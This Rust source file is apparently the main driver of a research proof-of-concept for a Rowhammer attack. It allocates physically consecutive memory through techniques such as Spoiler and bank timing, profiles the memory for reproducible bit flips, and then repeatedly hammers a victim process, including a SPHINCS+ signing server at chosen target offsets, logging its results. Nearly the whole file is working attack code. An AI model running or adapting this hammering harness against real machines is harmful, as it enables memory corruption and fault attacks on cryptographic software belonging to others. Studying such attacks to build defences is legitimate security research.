use std::{
    collections::HashMap,
    fs::File,
    io::{stdin, BufReader, BufWriter, Write},
    time::Duration,
};

use anyhow::bail;
use bs_poc::{
    allocator::hugepage::HugepageAllocator,
    hammerer::{make_hammer, HammerResult, HammerStrategy},
    memory::{BitFlip, DataPattern, Initializable, VictimMemory},
    util::{CL_SIZE, MB, PAGE_MASK},
    victim::{HammerVictimError, VictimResult},
};
use bs_poc::{
    allocator::{self, BuddyInfo, ConsecAlloc, ConsecAllocator, Mmap, Pfn},
    memory::ConsecCheck,
    victim::{self, sphincs_plus::TARGET_OFFSETS_SHAKE_256S},
};
use bs_poc::{
    allocator::{CoCo, HugepageRandomized, Spoiler},
    hammerer::Hammerer,
};
use bs_poc::{hammerer::blacksmith::blacksmith_config::BlacksmithConfig, victim::HammerVictim};
use bs_poc::{
    hammerer::blacksmith::hammerer::{FuzzSummary, HammeringPattern, PatternAddressMapper},
    memory::PfnResolver,
};
use bs_poc::{hammerer::Hammering, util::Rng};
use bs_poc::{memory::mem_configuration::MemConfiguration, util::PAGE_SIZE};
use bs_poc::{
    memory::{BytePointer, ConsecBlocks, ConsecCheckBankTiming},
    retry,
    util::init_logging_with_progress,
};
use clap::{Parser, Subcommand};
use indicatif::{MultiProgress, ProgressBar};
use itertools::Itertools;
use log::{debug, info, warn};
use serde::Serialize;

/// CLI arguments for the `hammer` binary.
///
/// This struct defines the command line arguments that can be passed to the `hammer` binary.
#[derive(Debug, Parser, Serialize)]
struct CliArgs {
    ///The `blacksmith` config file.
    #[clap(long = "config", default_value = "config/bs-config.json")]
    config: String,
    /// The JSON file containing hammering patterns to load.
    #[clap(long = "load-json", default_value = "config/fuzz-summary.json")]
    load_json: String,
    /// The pattern ID to load from the `blacksmith` JSON file.
    #[clap(
        long = "pattern",
        default_value = "39ad622b-3bfe-4161-b860-dad5f3e6dd68"
    )]
    pattern: Option<String>,
    /// The mapping ID to load from the `blacksmith` JSON file. Optional argument, will determine most optimal pattern if omitted.
    #[clap(long = "mapping")]
    mapping: Option<String>,
    /// The allocation strategy to use.
    #[clap(long = "alloc-strategy", default_value = "spoiler")]
    alloc_strategy: AllocStrategy,
    /// The hammering strategy to use.
    #[clap(long = "hammerer", default_value = "blacksmith")]
    hammerer: HammerStrategy,
    /// Repeat the hammering until the target reports a successful attack. If --repeat is specified without a value, the hammering will
    /// repeat indefinitely. The victim process is restarted for each repetition. The default is to repeat the hammering once and exit even if the attack was not successful.
    /// A repetition denotes a complete run of the suite:
    /// 1. allocate memory using the requested `alloc-strategy`
    /// 2. initialize the victim, potentially running a memory massaging technique to inject a target page
    /// 3. run the hammer attack using the requested `hammerer` for a number of `rounds`
    /// 4. If the attack was successful: log the report and exit. Otherwise, repeat the suite if the repetition limit is not reached.
    #[arg(long)]
    repeat: Option<usize>,
    /// The timeout in minutes for the hammering process.
    #[arg(long)]
    timeout: u64,
    /// The number of rounds to profile for vulnerable addresses.
    /// A round denotes a run of a given hammerer, potentially with multiple attempts at hammering the target.
    #[arg(long, default_value = "10")]
    profiling_rounds: u64,
    /// The reproducibility threshold for a bit flip to be considered reproducible.
    /// The threshold is a fraction of the number of profiling rounds. If a bit flip is detected in at least `threshold` rounds, it is considered reproducible.
    /// The default value of 0.8 means that a bit flip must be detected in at least 80% of the profiling rounds to be considered reproducible.
    #[arg(long, default_value = "0.8")]
    reproducibility_threshold: f64,
    /// The number of hammering attempts per round.
    /// An attempt denotes a single run of the hammering code. Usually, hammerers need several attempts to successfully flip a bit in the victim.
    /// The default value of 100 is a good starting point for the blacksmith hammerer.
    #[arg(long, default_value = "100")]
    attempts: u32,
    /// The target binary to hammer. This is the binary that will be executed and communicated with via IPC. See `victim` module for more details.
    #[command(subcommand)]
    target: Option<Target>,
}

#[derive(Clone, Debug, Subcommand, Serialize)]
enum Target {
    DevMemCheck,
    MemCheck,
    SphincsPlus {
        #[clap(default_value = "victims/sphincsplus/ref/test/server")]
        binary: String,
    },
    #[allow(clippy::enum_variant_names)]
    TargetCheck,
    None,
}

/// The type of allocation strategy to use.
#[derive(clap::ValueEnum, Clone, Debug, Serialize)]
pub enum AllocStrategy {
    /// Use `/proc/buddyinfo` to monitor availability of page orders, assume consecutive memory according to the delta in buddyinfo.
    BuddyInfo,
    // Allocate using the CoCo dec mem module: https://git.its.uni-luebeck.de/research-projects/tdx/kmod-coco-dec-mem
    CoCo,
    /// Allocate consecutive memory using huge pages.
    Hugepage,
    /// Allocate consecutive memory using huge pages with randomization. This will return random 4 MB chunks of a 1 GB hugepage.
    HugepageRnd,
    /// Allocate consecutive memory using `bank timing`. This will `mmap` a large buffer and find consecutive memory using bank timing check
    BankTiming,
    /// Allocate a large block of memory and use pagemap to find consecutive blocks
    Pfn,
    /// Allocate consecutive memory using the Spoiler attack. This strategy will measure read-after-write pipeline conflicts to determine consecutive memory.
    Spoiler,
}

impl AllocStrategy {
    fn create_allocator(
        &self,
        mem_config: MemConfiguration,
        conflict_threshold: u64,
        progress: Option<MultiProgress>,
    ) -> allocator::ConsecAlloc {
        match self {
            AllocStrategy::BuddyInfo => ConsecAlloc::BuddyInfo(BuddyInfo::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
            )),
            AllocStrategy::CoCo => ConsecAlloc::CoCo(CoCo {}),
            AllocStrategy::BankTiming => ConsecAlloc::Mmap(Mmap::new(
                ConsecCheck::BankTiming(ConsecCheckBankTiming::new(mem_config, conflict_threshold)),
                progress,
            )),
            AllocStrategy::Hugepage => ConsecAlloc::Hugepage(HugepageAllocator::default()),
            AllocStrategy::HugepageRnd => ConsecAlloc::HugepageRnd(HugepageRandomized::new(1)),
            AllocStrategy::Pfn => ConsecAlloc::Pfn(Pfn::new(mem_config, None)),
            AllocStrategy::Spoiler => ConsecAlloc::Spoiler(Box::new(Spoiler::new(
                mem_config,
                conflict_threshold,
                progress,
            ))),
        }
    }
}

fn cli_ask_pattern(json_filename: String) -> anyhow::Result<String> {
    let f = File::open(&json_filename)?;
    let reader = BufReader::new(f);
    let fuzz: FuzzSummary = serde_json::from_reader(reader)?;
    let pattern = retry!(|| {
        println!("Please choose a pattern:");
        for (i, pattern) in fuzz.hammering_patterns.iter().enumerate() {
            let best_mapping = pattern
                .determine_most_effective_mapping()
                .expect("no mappings");
            println!(
                "{}: {} (best mapping {} with {} flips)",
                i,
                pattern.id,
                best_mapping.id,
                best_mapping.count_bitflips()
            )
        }
        let mut option = String::new();
        stdin()
            .read_line(&mut option)
            .expect("Did not enter a correct string");
        match str::parse::<usize>(option.trim()) {
            Ok(i) => {
                if i < fuzz.hammering_patterns.len() {
                    return Ok(fuzz.hammering_patterns[i].id.clone());
                }
                bail!(
                    "Invalid pattern index {}/{}",
                    i,
                    fuzz.hammering_patterns.len()
                );
            }
            Err(e) => Err(e.into()),
        }
    });
    Ok(pattern)
}

struct LoadedPattern {
    pattern: HammeringPattern,
    mapping: PatternAddressMapper,
}

fn load_pattern(args: &CliArgs) -> anyhow::Result<LoadedPattern> {
    // load patterns from JSON
    let pattern = match &args.pattern {
        Some(pattern) => pattern.clone(),
        None => cli_ask_pattern(args.load_json.clone())?,
    };

    let pattern = HammeringPattern::load_pattern_from_json(args.load_json.clone(), pattern)?;
    let mapping = match &args.mapping {
        Some(mapping) => pattern.find_mapping(mapping).expect("mapping not found"),
        None => pattern
            .determine_most_effective_mapping()
            .expect("pattern contains no mapping"),
    };

    info!("Using mapping {}", mapping.id);
    let max_flips = mapping.count_bitflips();
    info!("Max flips: {:?}", max_flips);
    if max_flips == 0 {
        bail!("No flips in mapping");
    }
    Ok(LoadedPattern { pattern, mapping })
}

#[derive(Debug, Serialize, Clone)]
struct RoundProfile {
    bit_flips: Vec<BitFlip>,
    pattern: DataPattern,
}

/// Hammer a given `memory` region `num_rounds` times to profile for vulnerable addresses.
fn hammer_profile(
    hammerer: &Hammerer,
    memory: &ConsecBlocks,
    num_rounds: u64,
    reproducibility_threshold: f64,
    progress: Option<MultiProgress>,
) -> RoundProfile {
    let p = progress
        .as_ref()
        .map(|p| p.add(ProgressBar::new(num_rounds)));

    const _SHM_SEED: u64 = 9804201662804659191;
    let pattern = DataPattern::Random(Box::new(Rng::from_seed(rand::random())));
    let mut candidates = HashMap::new();
    let min_repro_count = (reproducibility_threshold * num_rounds as f64) as u64;
    for r in 1..=num_rounds {
        if let Some(p) = p.as_ref() {
            p.inc(1)
        }
        if candidates.is_empty() && r > num_rounds - min_repro_count {
            warn!(
                    "No candidates and only {} round(s) left. Stopping profiling, continuing with next pattern", num_rounds - r
                );
            break;
        }
        let mut victim = victim::MemCheck::new(memory, pattern.clone(), vec![]);
        let result = hammerer.hammer(&mut victim);
        let bit_flips = match result {
            Ok(result) => {
                info!(
                    "Profiling hammering round successful at attempt {}: {:?}",
                    result.attempt, result.victim_result
                );
                result.victim_result.bit_flips()
            }
            Err(e) => {
                warn!("Profiling hammering round not successful: {:?}", e);
                vec![]
            }
        };
        for flip in bit_flips {
            let entry = candidates.entry(flip).or_insert(0);
            *entry += 1;
        }
        let remaining_rounds = num_rounds - r;
        candidates.retain(|_, v| *v + remaining_rounds >= min_repro_count);
        info!("Profiling round {} candidates: {:?}", r, candidates);
    }
    RoundProfile {
        bit_flips: candidates.keys().cloned().collect(),
        pattern,
    }
}

type ExperimentError = String;

#[derive(Serialize)]
struct ExperimentData<T, E> {
    date: String,
    results: Vec<Result<T, E>>,
    profiling: RoundProfile,
    data: Option<serde_json::Value>,
}

impl<T, E> ExperimentData<T, E> {
    fn new(
        results: Vec<Result<T, E>>,
        profiling: RoundProfile,
        data: Option<serde_json::Value>,
    ) -> Self {
        Self {
            date: chrono::Local::now().to_rfc3339(),
            results,
            profiling,
            data,
        }
    }
}

fn check_timeout(timeout: Duration, start: std::time::Instant) -> bool {
    std::time::Instant::now() - start > timeout
}

unsafe fn _main() -> anyhow::Result<()> {
    let progress = init_logging_with_progress()?;

    // parse args
    let args = CliArgs::parse();

    let config = BlacksmithConfig::from_jsonfile(&args.config)?;
    let mem_config = MemConfiguration::from_blacksmith(&config);
    let pattern = load_pattern(&args)?;

    info!("Args: {:?}", args);

    let mut alloc_strategy =
        args.alloc_strategy
            .create_allocator(mem_config, config.threshold, Some(progress.clone()));
    let block_size = alloc_strategy.block_size();

    let repetitions = match args.repeat {
        Some(repeat) => repeat,
        None => usize::MAX,
    };

    let timeout = Duration::from_secs(args.timeout * 60);

    let start = std::time::Instant::now();

    let target = TARGET_OFFSETS_SHAKE_256S[7].clone();
    let mut experiments: Vec<ExperimentData<HammerResult, ExperimentError>> = vec![];
    'repeat: for rep in 0..repetitions {
        if rep > 0 && check_timeout(timeout, start) {
            info!("Timeout reached. Stopping.");
            break;
        }
        info!("Starting bait allocation");
        //unsafe { shm_unlink(CString::new("HAMMER_SHM").unwrap().as_ptr()) };
        let memory = allocator::alloc_memory(&mut alloc_strategy, mem_config, &pattern.mapping)?;
        let target_pfn = memory.addr(PAGE_SIZE + target.page_offset).pfn()?;
        info!("Allocated {} bytes of memory", memory.len());

        info!("Profiling memory for vulnerable addresses");
        info!(
            "Expecting bitflips at {:?}",
            pattern
                .mapping
                .get_bitflips_relocate(mem_config, block_size.ilog2() as usize, &memory)
        );
        let flush_buf: *mut u8 = allocator::util::mmap(std::ptr::null_mut(), 1024 * MB);
        let flush_lines = (0..1024 * MB)
            .step_by(CL_SIZE)
            .map(|offset| unsafe { flush_buf.byte_add(offset) as usize })
            .collect_vec();
        let hammer = make_hammer(
            &args.hammerer,
            &pattern.pattern,
            &pattern.mapping,
            mem_config,
            block_size,
            &memory,
            args.attempts,
            false,
            flush_lines.clone(),
            target_pfn,
            target.flip_direction.clone(),
        )?;
        let profiling = hammer_profile(
            &hammer,
            &memory,
            args.profiling_rounds,
            args.reproducibility_threshold,
            Some(progress.clone()),
        );
        debug!("Profiling results: {:?}", profiling);
        if profiling.bit_flips.is_empty() {
            warn!("No vulnerable addresses found");
            memory.dealloc();
            allocator::util::munmap(flush_buf, 1024 * MB);
            experiments.push(ExperimentData::new(
                vec![Err("No vulnerable addresses found".to_string())],
                profiling.clone(),
                None,
            ));
            continue;
        }

        let flips = profiling.bit_flips.clone();
        let dpattern = profiling.pattern.clone();

        let mut victim = match make_victim(
            args.target.clone().unwrap_or(Target::None),
            &memory,
            dpattern.clone(),
            flips.clone(),
        ) {
            Ok(victim) => victim,
            Err(e) => {
                memory.dealloc();
                allocator::util::munmap(flush_buf, 1024 * MB);
                warn!("Failed to start victim: {:?}", e);
                experiments.push(ExperimentData::new(vec![Err(e)], profiling.clone(), None));
                continue 'repeat;
            }
        };

        match victim.start() {
            Ok(_) => {}
            Err(e) => {
                warn!("Failed to start victim: {:?}", e);
                victim.stop();
                experiments.push(ExperimentData::new(
                    vec![Err(format!("Failed to start victim: {:?}", e))],
                    profiling.clone(),
                    Some(serde_json::to_value(&victim).expect("failed to serialize victim")),
                ));
                memory.dealloc();
                allocator::util::munmap(flush_buf, 1024 * MB);
                continue 'repeat;
            }
        }
        let flip_pages = flips
            .iter()
            .map(|f| (f.addr & !PAGE_MASK) as *const u8)
            .collect::<Vec<_>>();

        let mut results = vec![];
        loop {
            if check_timeout(timeout, start) {
                info!("Timeout reached. Stopping.");
                break;
            }
            memory.initialize_excluding(dpattern.clone(), &flip_pages);
            let result = hammer.hammer(&mut victim);
            match result {
                Ok(result) => {
                    info!("Hammering successful: {:?}", result.victim_result);
                    results.push(Ok(result));
                }
                Err(HammerVictimError::NoFlips) => {
                    warn!("No flips detected");
                    results.push(Err("No flips detected".to_string()));
                }
                Err(e) => {
                    warn!("Hammering failed: {:?}", e);
                    results.push(Err(format!("Hammering failed: {:?}", e)));
                    break;
                }
            }
        }
        experiments.push(ExperimentData::new(
            results,
            profiling.clone(),
            Some(serde_json::to_value(&victim).expect("failed to serialize victim")),
        ));
        victim.stop();
        memory.dealloc();
        allocator::util::munmap(flush_buf, 1024 * MB);
    }
    let now = chrono::Local::now().format("%Y-%m-%d_%H-%M-%S").to_string();
    let results_file = format!("results/results_{}.json", now);
    info!(
        "Timeout reached. Writing experiment results to file {}.",
        results_file
    );
    #[derive(Serialize)]
    struct ExperimentResult {
        args: CliArgs,
        experiments: Vec<ExperimentData<HammerResult, ExperimentError>>,
    }
    let res = ExperimentResult { args, experiments };
    let mut json_file = BufWriter::new(File::create(results_file)?);
    serde_json::to_writer_pretty(&mut json_file, &res)?;
    json_file.flush()?;
    Ok(())
}

#[allow(clippy::result_large_err)]
fn make_victim(
    target: Target,
    memory: &dyn VictimMemory,
    dpattern: DataPattern,
    flips: Vec<BitFlip>,
) -> Result<Victim<'_>, ExperimentError> {
    let flip = *flips.first().expect("No flips found");
    match target {
        Target::DevMemCheck => Ok(Victim::DevMemCheck(
            victim::DevMemCheck::new(flips).map_err(|e| {
                warn!("Failed to create victim: {}", e);
                format!("Failed to create victim: {}", e)
            })?,
        )),
        Target::MemCheck => Ok(Victim::MemCheck(victim::MemCheck::new(
            memory, dpattern, flips,
        ))),
        Target::SphincsPlus { binary } => Ok(Victim::SphincsPlus(
            victim::SphincsPlus::new(binary, flip).map_err(|e| {
                warn!("Failed to create victim: {}", e);
                format!("Failed to create victim: {}", e)
            })?,
        )),
        Target::TargetCheck => Ok(Victim::TargetCheck(victim::TargetCheck::new(
            memory, dpattern, flips,
        ))),
        Target::None => Err("No target specified".to_string()),
    }
}

#[derive(Serialize)]
enum Victim<'a> {
    DevMemCheck(victim::DevMemCheck),
    MemCheck(victim::MemCheck<'a>),
    SphincsPlus(victim::SphincsPlus),
    TargetCheck(victim::TargetCheck<'a>),
}

impl HammerVictim for Victim<'_> {
    fn start(&mut self) -> Result<(), HammerVictimError> {
        match self {
            Victim::DevMemCheck(v) => v.start(),
            Victim::MemCheck(v) => v.start(),
            Victim::SphincsPlus(v) => v.start(),
            Victim::TargetCheck(v) => v.start(),
        }
    }

    fn init(&mut self) {
        match self {
            Victim::DevMemCheck(v) => v.init(),
            Victim::MemCheck(v) => v.init(),
            Victim::SphincsPlus(v) => v.init(),
            Victim::TargetCheck(v) => v.init(),
        }
    }

    fn check(&mut self) -> Result<VictimResult, HammerVictimError> {
        match self {
            Victim::DevMemCheck(v) => v.check(),
            Victim::MemCheck(v) => v.check(),
            Victim::SphincsPlus(v) => v.check(),
            Victim::TargetCheck(v) => v.check(),
        }
    }

    fn stop(&mut self) {
        match self {
            Victim::DevMemCheck(v) => v.stop(),
            Victim::MemCheck(v) => v.stop(),
            Victim::SphincsPlus(v) => v.stop(),
            Victim::TargetCheck(v) => v.stop(),
        }
    }
}

fn main() -> anyhow::Result<()> {
    unsafe { _main() }
}
